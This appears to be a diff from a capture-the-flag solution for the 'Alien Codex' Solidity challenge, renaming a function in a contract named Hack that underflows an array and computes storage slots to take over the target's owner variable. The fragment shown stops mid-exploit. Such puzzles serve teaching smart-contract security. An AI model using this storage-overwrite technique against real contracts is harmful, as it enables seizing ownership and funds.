@@ -3,7 +3,7 @@ pragma solidity ^0.8.0;
 
 interface IAlienCodex {
   function owner() external view returns (address);
-  function make_contact() external;
+  function makeContact() external;
   function retract() external;
   function revise(uint i, bytes32 _content) external;
   function codex(uint256) external view returns (bytes32);
@@ -19,7 +19,7 @@ interface IAlienCodex {
 //     _;
 //   }
   
-//   function make_contact() public {
+//   function makeContact() public {
 //     contact = true;
 //   }
 
@@ -38,7 +38,7 @@ interface IAlienCodex {
 
 contract Hack {
   constructor(IAlienCodex target) {
-    target.make_contact();
+    target.makeContact();
     target.retract();
     uint256 lastSlotArray = uint256(keccak256(abi.encode(uint256(1))));
     uint256 ownerIndex;
